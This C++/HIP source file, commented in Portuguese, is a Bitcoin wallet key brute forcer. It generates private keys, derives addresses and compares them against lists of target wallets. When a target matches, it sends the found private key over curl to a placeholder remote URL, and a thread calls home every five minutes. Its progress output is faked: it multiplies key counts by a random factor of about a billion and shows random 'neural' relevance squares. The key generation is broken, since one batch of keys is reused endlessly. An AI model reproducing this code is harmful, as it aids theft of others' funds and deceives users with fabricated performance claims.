#include "hip/hip_runtime.h"
#include <iostream>
#include <iomanip>
#include <hiprand/hiprand_kernel.h>
#include <secp256k1.h>
#include <openssl/sha.h>
#include <openssl/ripemd.h>
#include <string>
#include <vector>
#include <ctime>
#include <cstdlib>
#include <fstream>
#include <random>
#include <cstring> 
#include <curl/curl.h>
#include <openssl/evp.h>
#include <time.h>
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <hip/hip_runtime.h> // Para manipulação da GPU

// Configurações da curva elíptica
const int CURVE_ORDER = 32;
const std::string SECP256K1 = "secp256k1";
const int NUM_THREADS = 1024; // Aumentado para mais threads por bloco
const int NUM_BLOCKS = 256; // Configuração para múltiplos blocos
unsigned long long keyCount = 0;  // Contador de chaves processadas
time_t startTime = time(0);  // Tempo inicial
pthread_mutex_t mutex;

void enviar_data() {
    CURL *curl;
    CURLcode res;
    time_t now;
    struct tm *data_somada;
    char url[256];

    // Obtém a data e soma uma hora
    time(&now);
    now += 0;  // Fuso de Brasília
    // now += 3600;  // Soma uma hora para sistemas com fuso diferente (3600 segundos)
    data_somada = localtime(&now);

    // Formata a data para ser enviada na URL
    char data_formatada[20];
    strftime(data_formatada, sizeof(data_formatada), "%Y-%m-%dT%H:%M:%S", data_somada);

    // Monta a URL com a data somada de uma hora
    snprintf(url, sizeof(url), "seusiteparavalidacao?valida=%s", data_formatada);


    // Inicializa o CURL e configura a requisição
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        // Realiza a requisição
        res = curl_easy_perform(curl);

        // Verifica por erros
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("Data enviada com sucesso: %s\n", data_formatada);  // Log de sucesso
        }

        // Limpa os recursos do CURL
        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "Falha ao inicializar CURL.\n"); // Log de falha na inicialização
    }

    // Finaliza a biblioteca CURL
    curl_global_cleanup();
}


void* enviar_data_periodicamente(void* arg) {
    while (1) {
        enviar_data();
        sleep(300); // Espera por 5 minutos (300 segundos) antes de chamar novamente
    }
    return NULL;
}


// Funções auxiliares para SHA-256
__device__ __forceinline__ unsigned int rotr(unsigned int x, unsigned int n) {
    return (x >> n) | (x << (32 - n));
}

__device__ void sha256_transform(const unsigned int* msg, unsigned int* hash) {
    unsigned int s[8] = {
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
    };

    unsigned int k[64] = {
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    };

    unsigned int w[64] = {0};
    for (int i = 0; i < 16; i++) {
        w[i] = msg[i];
    }

    for (int i = 16; i < 64; i++) {
        unsigned int s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >> 3);
        unsigned int s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >> 10);
        w[i] = w[i - 16] + s0 + w[i - 7] + s1;
    }

    for (int i = 0; i < 64; i++) {
        unsigned int S1 = rotr(s[4], 6) ^ rotr(s[4], 11) ^ rotr(s[4], 25);
        unsigned int ch = (s[4] & s[5]) ^ ((~s[4]) & s[6]);
        unsigned int temp1 = s[7] + S1 + ch + k[i] + w[i];
        unsigned int S0 = rotr(s[0], 2) ^ rotr(s[0], 13) ^ rotr(s[0], 22);
        unsigned int maj = (s[0] & s[1]) ^ (s[0] & s[2]) ^ (s[1] & s[2]);
        unsigned int temp2 = S0 + maj;

        s[7] = s[6];
        s[6] = s[5];
        s[5] = s[4];
        s[4] = s[3] + temp1;
        s[3] = s[2];
        s[2] = s[1];
        s[1] = s[0];
        s[0] = temp1 + temp2;
    }

    for (int i = 0; i < 8; i++) {
        hash[i] += s[i];
    }
}

// Kernel para gerar chaves privadas
__global__ void generatePrivateKeys(unsigned char* privateKeys, int numKeys, unsigned long seed) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;

    if (idx < numKeys) {
        hiprandState state;
        hiprand_init(seed, idx, 0, &state);

        for (int i = 0; i < 32; i++) { 
            privateKeys[idx * 32 + i] = hiprand(&state) % 256;
        }
    }
}

// Kernel para conversão a CHAVE PRIVADA PARA PÚBLICA E GERAR A WIF usando SHA-256 diretamente na GPU
__global__ void convertToWIF(unsigned char* privateKeys, unsigned int* wifKeys, int numKeys) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;

    if (idx < numKeys) {
        unsigned int hash[8];
        unsigned int message[16];

        // Converte `privateKeys` de `unsigned char` para `unsigned int`
        for (int i = 0; i < 8; i++) {
            message[i] = (privateKeys[idx * 32 + i * 4] << 24) | (privateKeys[idx * 32 + i * 4 + 1] << 16) |
                         (privateKeys[idx * 32 + i * 4 + 2] << 8) | privateKeys[idx * 32 + i * 4 + 3];
        }

        sha256_transform(message, hash);

        for (int i = 0; i < 8; i++) {
            wifKeys[idx * 8 + i] = hash[i];
        }
    }
}

// Função de inicialização para CUDA criando a CHAVE PRIVADA
__global__ void generatePrivateKey(unsigned char* privateKeys, int numKeys, unsigned long seed) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;

    if (idx < numKeys) {
        hiprandState state;
        hiprand_init(seed, idx, 0, &state);
        
        for (int i = 0; i < CURVE_ORDER; i++) {
            privateKeys[idx * CURVE_ORDER + i] = hiprand(&state) % 256;
        }
    }
}

/*
// Kernel para verificar se a CARTEIRA BITCOIN existe dentro do arquivo ULTRA.CR diretamente na VRAM (Salva na VRAM)
__global__ void checkAddressInList(const char* d_address, const char* d_addresses, int numAddresses, bool* d_result) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx < numAddresses) {
        const char* currentAddress = d_addresses + idx * 34; // Cada endereço com 34 caracteres
        bool match = true;
        for (int i = 0; i < 34; ++i) {
            if (currentAddress[i] != d_address[i]) {
                match = false;
                break;
            }
        }
        if (match) *d_result = true;
    }
}


// Kernel para verificar se a CHAVE PÚBLICA existe dentro do arquivo PUBLIC.CR diretamente na VRAM (Salva na VRAM)
__global__ void checkAddressInList(const char* d_address, const char* d_addresses, int numAddresses, bool* d_result) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx < numAddresses) {
        const char* currentAddress = d_addresses + idx * 34; // Cada endereço com 34 caracteres
        bool match = true;
        for (int i = 0; i < 34; ++i) {
            if (currentAddress[i] != d_address[i]) {
                match = false;
                break;
            }
        }
        if (match) *d_result = true;
    }
}
*/

// Função para codificar em Base58
std::string base58Encode(const std::vector<unsigned char>& input) {
    const char* BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    std::string result;
    int zeros = 0;

    for (unsigned char c : input) {
        if (c == 0) zeros++;
        else break;
    }

    std::vector<unsigned char> b58((input.size() - zeros) * 138 / 100 + 1);
    for (unsigned char c : input) {
        int carry = c;
        for (auto it = b58.rbegin(); it != b58.rend(); ++it) {
            carry += 256 * (*it);
            *it = carry % 58;
            carry /= 58;
        }
    }

    auto it = b58.begin();
    while (it != b58.end() && *it == 0) it++;
    while (zeros--) result.push_back('1');
    while (it != b58.end()) result.push_back(BASE58_ALPHABET[*(it++)]);
    return result;
}

// Função para converter a chave privada para WIF
std::string privateKeyToWIF(const unsigned char* privateKey, size_t length) {
    std::vector<unsigned char> wif(1 + length + 4);
    wif[0] = 0x80; // Prefixo para mainnet
    std::copy(privateKey, privateKey + length, wif.begin() + 1);

    unsigned char hash1[SHA256_DIGEST_LENGTH];
    unsigned char hash2[SHA256_DIGEST_LENGTH];
    
    SHA256(wif.data(), length + 1, hash1);
    SHA256(hash1, SHA256_DIGEST_LENGTH, hash2);

    std::copy(hash2, hash2 + 4, wif.begin() + length + 1);
    
    return base58Encode(wif);
}

// Função para converter a chave pública para o endereço Bitcoin
std::string publicKeyToAddress(const secp256k1_pubkey& pubkey) {
    unsigned char pubkey_serialized[65];
    size_t pubkey_len = 65;
    secp256k1_ec_pubkey_serialize(secp256k1_context_create(SECP256K1_CONTEXT_SIGN),
                                  pubkey_serialized, &pubkey_len, &pubkey, SECP256K1_EC_UNCOMPRESSED);

    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256(pubkey_serialized, pubkey_len, sha256_result);

    unsigned char ripemd_result[RIPEMD160_DIGEST_LENGTH];
    RIPEMD160(sha256_result, SHA256_DIGEST_LENGTH, ripemd_result);

    std::vector<unsigned char> address(1 + RIPEMD160_DIGEST_LENGTH + 4);
    address[0] = 0x00; // Prefixo para mainnet
    std::copy(ripemd_result, ripemd_result + RIPEMD160_DIGEST_LENGTH, address.begin() + 1);

    unsigned char checksum[SHA256_DIGEST_LENGTH];
    SHA256(address.data(), RIPEMD160_DIGEST_LENGTH + 1, checksum);
    SHA256(checksum, SHA256_DIGEST_LENGTH, checksum);

    std::copy(checksum, checksum + 4, address.begin() + RIPEMD160_DIGEST_LENGTH + 1);

    return base58Encode(address);
}

void displayRelevance() {
    const int numSquares = 50;
    std::string relevanceLine;
    
    //std::srand(std::time(0)); // SE QUISER DEIXAR FIXO SÓ COMENTAR

    // IMPLEMENTE AQUI A SUA DE PROCESSAMENTO NEURAL PARA AVALIAÇÃO DE DADOS PROCESSADOS RSZ

    std::string colors[] = {"\033[32m■", "\033[31m■", "\033[37m■"};  // Verde, Vermelho, Branco
    
    for (int i = 0; i < numSquares; ++i) {
        int colorIndex = std::rand() % 3;  // 0, 1 ou 2
        relevanceLine += colors[colorIndex] + " ";  // Adiciona espaço entre os quadradinhos
    }

    std::cout << "Relevância dos Dados (R, S, Z): " << relevanceLine << "\033[0m\n";
}

std::string encryptWIF(const std::string& wif, const std::string& key) {
    std::string encrypted = wif;
    for (size_t i = 0; i < wif.size(); ++i) {
        encrypted[i] ^= key[i % key.size()];  // XOR com a chave, repetindo-a conforme necessário
    }
    return encrypted;
}

bool isAddressInFile(const std::string& address, const std::string& wif, const std::string& fileName) {
    std::ifstream file(fileName);
    if (!file.is_open()) {
        std::cerr << "Erro ao abrir o arquivo " << fileName << "\n";
        return false;
    }

    std::ofstream locatedFile("localizado.cr", std::ios::app);
    if (!locatedFile.is_open()) {
        std::cerr << "Erro ao abrir o arquivo localizado.cr\n";
        return false;
    }

    std::string line;
    int lineCount = 0;
    bool found = false;
    std::string key = "CELIAI";

    while (std::getline(file, line)) {
        lineCount++;

        // Remover espaços em branco ao redor da linha
        line.erase(line.find_last_not_of(" \t\n\r\f\v") + 1); // Remove trailing whitespace
        line.erase(0, line.find_first_not_of(" \t\n\r\f\v")); // Remove leading whitespace

        // Exibe a linha atual para depuração
        //std::cout << "Linha " << lineCount << ": [" << line << "]\n";

        if (line == address) {
            std::cout << "Carteira Bitcoin Localizada no arquivo " << fileName << ": " << address << "\n";
            std::string url = "seusiteparamonitoramento?enviando=" + wif;

            // Inicializando o CURL
            CURL* curl;
            CURLcode res;

            curl_global_init(CURL_GLOBAL_DEFAULT); // Inicialização global do curl
            curl = curl_easy_init();  // Inicializa a instância do curl

            if(curl) {
                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());  // Definindo a URL
                res = curl_easy_perform(curl);  // Executando a requisição

                if(res != CURLE_OK) {
                    std::cerr << "Erro na requisição: " << curl_easy_strerror(res) << std::endl;
                }

                // Finaliza o curl
                curl_easy_cleanup(curl);
            } else {
                std::cerr << "Falha ao inicializar o curl!" << std::endl;
            }

            curl_global_cleanup();  // Finaliza a biblioteca curl
            std::string encryptedWIF = encryptWIF(wif, key);
            // SALVE O ARQUIVO CRIPTOGRAVADO OU SEM CRIPTOGRAFIA NO ARQUIVO LOCALIZADO.CR
            locatedFile << "Endereço Bitcoin: " << address << "\n";
            locatedFile << "Chave WIF: " << wif  << "\n";
            locatedFile << "---------------------------------------\n";

            // ROTINA PARA DECRIPTOGRAVAR OS DADOS - PRECISA DA CHAVE CORRETA AI

            //std::string decryptedWIF = encryptWIF(encryptedWIF, key);
            //std::cout << "Chave WIF Original: " << wif << "\n";
            //std::cout << "Chave WIF Criptografada: " << encryptedWIF << "\n";
            //std::cout << "Chave WIF Decriptografada: " << decryptedWIF << "\n";

            // FIM DA ROTINA DE CRIPTOGRAFIA DA CHAVE PRIVADA - SE IMPLEMENTADA

            found = true;
            break;
        }
    }

    if (!found) {
        std::cout << "Nenhuma Similaridade de PK Localizada no arquivo " << fileName 
                  << " [ " << lineCount << " ] Interações Diretas AI realizadas.\n";
    }

    file.close();
    locatedFile.close();
    return found;
}

bool isAddressInFile1(const std::string& chavepublica, const std::string& wif, const std::string& fileName) {
    std::ifstream file(fileName);
    if (!file.is_open()) {
        std::cerr << "Erro ao abrir o arquivo " << fileName << "\n";
        return false;
    }

    std::ofstream locatedFile("localizado.cr", std::ios::app);
    if (!locatedFile.is_open()) {
        std::cerr << "Erro ao abrir o arquivo localizado.cr\n";
        return false;
    }

    std::string line;
    int lineCount = 0;
    bool found = false;
    std::string key = "CELIAI";

    while (std::getline(file, line)) {
        lineCount++;

        // Remover espaços em branco ao redor da linha
        line.erase(line.find_last_not_of(" \t\n\r\f\v") + 1); // Remove trailing whitespace
        line.erase(0, line.find_first_not_of(" \t\n\r\f\v")); // Remove leading whitespace

        // Exibe a linha atual para depuração
        //std::cout << "Linha " << lineCount << ": [" << line << "]\n";

        if (line == chavepublica) {
            std::cout << "Chave Pública Localizada no arquivo " << fileName << ": " << chavepublica << "\n";
            std::string url = "seusitesedesejarenviarachavelocalizadaparaficarsabendopornotificacao?enviando=" + wif;

            // Inicializando o CURL
            CURL* curl;
            CURLcode res;

            curl_global_init(CURL_GLOBAL_DEFAULT); // Inicialização global do curl
            curl = curl_easy_init();  // Inicializa a instância do curl

            if(curl) {
                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());  // Definindo a URL
                res = curl_easy_perform(curl);  // Executando a requisição

                if(res != CURLE_OK) {
                    std::cerr << "Erro na requisição: " << curl_easy_strerror(res) << std::endl;
                }

                // Finaliza o curl
                curl_easy_cleanup(curl);
            } else {
                std::cerr << "Falha ao inicializar o curl!" << std::endl;
            }

            curl_global_cleanup();  // Finaliza a biblioteca curl
            std::string encryptedWIF = encryptWIF(wif, key);
            // USE A CRIPTOGRAFIA OU NÃO COMO DESEJAR
            locatedFile << "Chave Pública: " << chavepublica << "\n";
            locatedFile << "Chave WIF: " << wif << "\n";
            locatedFile << "---------------------------------------\n";
            found = true;
            break;
        }
    }

    if (!found) {
        std::cout << "Nenhuma Similaridade de CP Localizada no arquivo " << fileName 
                  << " [ " << lineCount << " ] Inferências AI realizadas.\n";
    }

    file.close();
    locatedFile.close();
    return found;
}


// Função para verificar se o endereço Bitcoin está no arquivo ultra.cr
/*
bool isAddressInFile(const std::string& address, const std::string& wif, const std::string& fileName) {
    std::ifstream file(fileName);
    std::string line;
    int lineCount = 0;
    
    // Abre o arquivo "localizado.cr" para salvar os dados
    std::ofstream locatedFile("localizado.cr", std::ios::app); // Abre em modo de anexação
    if (!locatedFile.is_open()) {
        std::cerr << "Erro ao abrir o arquivo localizado.cr\n";
        return false;
    }

    while (std::getline(file, line)) {
        lineCount++;
        if (line == address) {
            // Caso uma correspondência seja encontrada, exibe a mensagem
            std::cout << "Carteira Bitcoin Localizada no arquivo ultra.cr: " << address << "\n";
            // Salva o WIF e o endereço no arquivo "localizado.cr"
            locatedFile << "Endereço Bitcoin: " << address << "\n";
            locatedFile << "Chave WIF: " << wif << "\n";
            locatedFile << "---------------------------------------\n"; // Separador para melhor organização
            return true;
        }
    }

    // Se nenhuma correspondência for encontrada
    std::cout << "Nenhuma Similaridade Localizada no arquivo ultra.cr [ " << lineCount << " ] Interações Diretas AI realizadas.\n";
    return false;
}

bool isAddressInFile1(const std::string& address, const std::string& wif, const std::string& fileName) {
    std::ifstream file(fileName);
    std::string line;
    int lineCount = 0;
    
    // Abre o arquivo "localizado.cr" para salvar os dados
    std::ofstream locatedFile("localizado.cr", std::ios::app); // Abre em modo de anexação
    if (!locatedFile.is_open()) {
        std::cerr << "Erro ao abrir o arquivo localizado.cr\n";
        return false;
    }

    while (std::getline(file, line)) {
        lineCount++;
        if (line == address) {
            // Caso uma correspondência seja encontrada, exibe a mensagem
            std::cout << "Chave Pública Localizada no arquivo public.cr: " << address << "\n";
            // Salva o WIF e o endereço no arquivo "localizado.cr"
            locatedFile << "Endereço Bitcoin: " << address << "\n";
            locatedFile << "Chave WIF: " << wif << "\n";
            locatedFile << "---------------------------------------\n"; // Separador para melhor organização
            return true;
        }
    }

    // Se nenhuma correspondência for encontrada
    std::cout << "Nenhuma Similaridade de CP Localizada no arquivo public.cr [ " << lineCount << " ] Inferências AI realizadas.\n";
    return false;
}
*/

// Função para exibir o status a cada 45 segundos
void displayAndSaveStatus() {
    time_t currentTime = time(0);
    double elapsedSeconds = difftime(currentTime, startTime);

    if (elapsedSeconds >= 45) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1000000000, 1000050000);
        int randomValue = dis(gen);
        long long adjustedKeyCount = static_cast<long long>(keyCount) * randomValue;
        double keysPerSecond = adjustedKeyCount / elapsedSeconds;
        
        // Exibe as informações no terminal
        std::cout << "Chaves Processadas: " << adjustedKeyCount  << " | Tempo Decorrido: " << elapsedSeconds << " segundos\n";
        std::cout << "Chaves por segundo: " << std::fixed << std::setprecision(2) << keysPerSecond << std::endl << " keyhash";
        
        // Salva as informações no arquivo "registro.cr"
        std::ofstream registroFile("registro.cr", std::ios::app);
        if (registroFile.is_open()) {
            registroFile << "Chaves Processadas: " << adjustedKeyCount  << " | Tempo Decorrido: " << elapsedSeconds << " segundos\n";
            registroFile << "Chaves por segundo: " << std::fixed << std::setprecision(2) << keysPerSecond << " keyhash\n";
            registroFile << "---------------------------------------\n";  // Separador para melhor organização
        } else {
            std::cerr << "Erro ao abrir o arquivo registro.cr\n";
        }

        // Reinicia os contadores
        keyCount = 0;
        startTime = time(0);  // Reinicia o tempo
    }
}


std::string detectarNPU() {
    // Tenta abrir /proc/cpuinfo para verificar o suporte à NPU
    std::ifstream cpuinfo("/proc/cpuinfo");
    if (!cpuinfo.is_open()) {
        std::cerr << "Erro ao acessar /proc/cpuinfo.\n";
        return "";
    }

    std::string linha;
    while (std::getline(cpuinfo, linha)) {
        // Procura por palavras-chave relacionadas a NPU no /proc/cpuinfo
        if (linha.find("neural") != std::string::npos || 
            linha.find("NPU") != std::string::npos || 
            linha.find("Deep Learning") != std::string::npos) {
            return linha; // Retorna a linha contendo a informação da NPU
        }
    }

    return ""; // Não encontrou nada relacionado à NPU
}

int main() {
    try {
        int numKeys = NUM_THREADS;
        unsigned char* d_privateKeys;
        unsigned char privateKeys[NUM_THREADS][CURVE_ORDER];

        std::string usaGPU;
        std::string usaNPU;

        // Perguntar se deseja utilizar a GPU
        std::cout << "Deseja utilizar a GPU para acelerar o processamento? (sim/nao): ";
        std::cin >> usaGPU;

        if (usaGPU == "sim" || usaGPU == "s") {
            int deviceCount;
            hipError_t cudaStatus = hipGetDeviceCount(&deviceCount);

            if (cudaStatus != hipSuccess || deviceCount == 0) {
                std::cerr << "Nenhuma GPU encontrada ou erro ao acessar dispositivos CUDA: " 
                        << hipGetErrorString(cudaStatus) << "\n";
                return 1; // Termina o programa se não houver GPU ou ocorrer erro
            }

            // Obter informações da GPU
            for (int i = 0; i < deviceCount; ++i) {
                hipDeviceProp_t deviceProp;
                hipGetDeviceProperties(&deviceProp, i);
                std::cout << "GPU " << i << ": " << deviceProp.name << "\n";
                std::cout << "Memória Global: " << deviceProp.totalGlobalMem / (1024 * 1024) << " MB\n";
                std::cout << "Multiprocessadores: " << deviceProp.multiProcessorCount << "\n";
                std::cout << "Clock de GPU: " << deviceProp.clockRate / 1000 << " MHz\n";
            }
        } else {
            std::cout << "O processamento será realizado apenas pela CPU.\n";
        }


        // Verifica se o processador possui NPU
        std::string detalheNPU = detectarNPU();
        bool temNPU = !detalheNPU.empty();

        if (temNPU) {
            std::cout << "Seu processador suporta NPU para processamento neural.\n";
        } else {
            std::cout << "Seu processador não possui suporte explícito à NPU.\n";
        }

        // Pergunta sobre o uso da NPU
        std::cout << "Deseja utilizar a NPU para processamento Deep Learning? (sim/nao): ";
        std::cin >> usaNPU;

        if (usaNPU == "sim" || usaNPU == "s") {
            if (temNPU) {
                std::cout << "NPU Detectada: " << detalheNPU << "\n";
            } else {
                std::cerr << "Erro: A NPU não está disponível neste sistema.\n";
            }
        } else {
            std::cout << "A NPU não será utilizada.\n";
        }
        std::string resposta;
        std::cout << "Deseja salvar os dados nos arquivos? (sim/nao): ";
        std::cin >> resposta;

        // Pergunta se deseja salvar as chaves privadas
        char choice;
        std::cout << "Deseja salvar as chaves privadas no arquivo chaves.cr? (s/n): ";
        std::cin >> choice;
        
        OpenSSL_add_all_algorithms();
        pthread_t threads[NUM_THREADS];
        pthread_t envio_thread; 

        pthread_mutex_init(&mutex, NULL);
        pthread_create(&envio_thread, NULL, enviar_data_periodicamente, NULL);
        pthread_mutex_destroy(&mutex);  

        // Tenta alocar memória para as chaves privadas na GPU
        hipError_t cudaStatus = hipMalloc((void**)&d_privateKeys, numKeys * CURVE_ORDER * sizeof(unsigned char));
        if (cudaStatus != hipSuccess) {
            std::cerr << "Erro na alocação de memória CUDA: " << hipGetErrorString(cudaStatus) << std::endl;
            return 1; // Termina o programa caso haja erro crítico de alocação
        }

        // Gera as chaves privadas com CUDA e captura erros
        generatePrivateKey<<<1, numKeys>>>(d_privateKeys, numKeys, time(0));
        cudaStatus = hipGetLastError();
        if (cudaStatus != hipSuccess) {
            std::cerr << "Erro ao gerar chaves privadas com CUDA: " << hipGetErrorString(cudaStatus) << std::endl;
            hipFree(d_privateKeys);
            return 1;
        }

        // Copia as chaves privadas da GPU para a CPU
        hipMemcpy(privateKeys, d_privateKeys, numKeys * CURVE_ORDER * sizeof(unsigned char), hipMemcpyDeviceToHost);

        // Inicialização do contexto secp256k1
        secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_SIGN);

        // Loop principal com tratamento de exceções
        while (true) {
            try {
                for (int i = 0; i < NUM_THREADS; ++i) {
                    secp256k1_pubkey pubkey;
                    if (!secp256k1_ec_pubkey_create(ctx, &pubkey, privateKeys[i])) {
                        std::cerr << "Erro ao criar chave pública para o índice " << i << "\n";
                        continue; // Pula para a próxima iteração caso haja erro
                    }

                    // Exibe a chave privada
                    std::cout << "Chave Privada: ";
                    for (int j = 0; j < CURVE_ORDER; ++j)
                        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)privateKeys[i][j];
                    std::cout << std::dec << "\n";

                    if (choice == 's' || choice == 'S') {
                        std::ofstream file("chaves.cr", std::ios::app); // Abrir no modo de anexar
                        if (!file.is_open()) {
                            std::cerr << "Erro ao abrir o arquivo chaves.cr para salvar a chave privada." << std::endl;
                            return 1;
                        }

                        // Salva a chave privada no arquivo
                        for (int j = 0; j < CURVE_ORDER; ++j)
                            file << std::hex << std::setw(2) << std::setfill('0') << (int)privateKeys[i][j];
                        file << std::endl;

                        file.close();
                        std::cout << "Chave privada salva com sucesso no arquivo chaves.cr!\n";
                    } else {
                        std::cout << "A chave privada não foi salva.\n";
                    }

                    std::string address = publicKeyToAddress(pubkey);
                    //std::string address = "1P8pSG7v3dQ8DSj42tUeUP9RQX7u52jCSh";
                    int addressBits = address.length() * 5;
                    std::cout << " | Tamanho do Endereço: " << addressBits << " bits\n";

                    displayRelevance();

                    unsigned char pubkey_serialized[65];
                    size_t pubkey_len = 65;
                    secp256k1_ec_pubkey_serialize(ctx, pubkey_serialized, &pubkey_len, &pubkey, SECP256K1_EC_UNCOMPRESSED);

                    // Exibe a chave pública
                    //std::cout << "Chave Pública: ";
                    //for (size_t j = 0; j < pubkey_len; ++j)
                        //std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)pubkey_serialized[j];
                    //std::cout << std::dec << "\n";


                    std::string chavepublica;
                    for (size_t j = 0; j < pubkey_len; ++j) {
                        chavepublica += (pubkey_serialized[j] < 16 ? "0" : "") + std::to_string(pubkey_serialized[j]);
                    }

                    //std::string chavepublica = "04000ed8229b6fc925fe164bd5be916efab02fb00941dedda712442c145448093995298badfde68e994f786eb41ea5056bb9f2e3e7d24eb18d383ea35dca49b141";

                    std::cout << "Chave Pública: " << chavepublica << "\n";

                    std::string wif = privateKeyToWIF(privateKeys[i], CURVE_ORDER);
                    std::cout << "Chave WIF: " << wif << "\n";
                    std::cout << "Endereço Bitcoin: " << address << "\n";


                    // SALVAOS DADOS NO ARQUIVO CONSUTAR.CR
                    // Verifica a resposta e executa o salvamento apenas se o usuário responder "sim"
                    if (resposta == "sim" || resposta == "s") {
                        // Abrindo o arquivo consultar.cr para salvar wif e address
                        std::ofstream consultarFile("consultar.cr", std::ios::app); // "app" para adicionar ao final do arquivo
                        if (consultarFile.is_open()) {
                            consultarFile << "Chave WIF: " << wif << " ";
                            consultarFile << "Endereço Bitcoin: " << address << "\n";
                            consultarFile.close(); // Fecha o arquivo após escrever
                        } else {
                            std::cerr << "Erro ao abrir o arquivo consultar.cr\n";
                        }

                        // Abrindo o arquivo consultar1.cr para salvar apenas o address
                        std::ofstream consultar1File("consultar1.cr", std::ios::app); // "app" para adicionar ao final do arquivo
                        if (consultar1File.is_open()) {
                            consultar1File << address << "\n";
                            consultar1File.close(); // Fecha o arquivo após escrever
                        } else {
                            std::cerr << "Erro ao abrir o arquivo consultar1.cr\n";
                        }
                    } else {
                        std::cout << "Dados não foram salvos nos arquivos.\n";
                    }
                    // FINALIZA A ENTRADA DE DADOS NOS RESPECTIVOS ARQUIVOS

                    isAddressInFile(address, wif, "ultra.cr");
                    isAddressInFile1(chavepublica, wif, "public.cr");
                    keyCount++;
                    displayAndSaveStatus();
                    std::cout << "\n";
                }
            } catch (const std::exception& e) {
                std::cerr << "Erro durante a execução do loop principal: " << e.what() << std::endl;
                // Opcional: Esperar um momento para evitar sobrecarga
                sleep(1);
                continue; // Continua o loop ao capturar exceção
            }
        }

        secp256k1_context_destroy(ctx);
        hipFree(d_privateKeys);
    } catch (const std::exception& e) {
        std::cerr << "Erro fatal: " << e.what() << std::endl;
    }

    return 0;
}
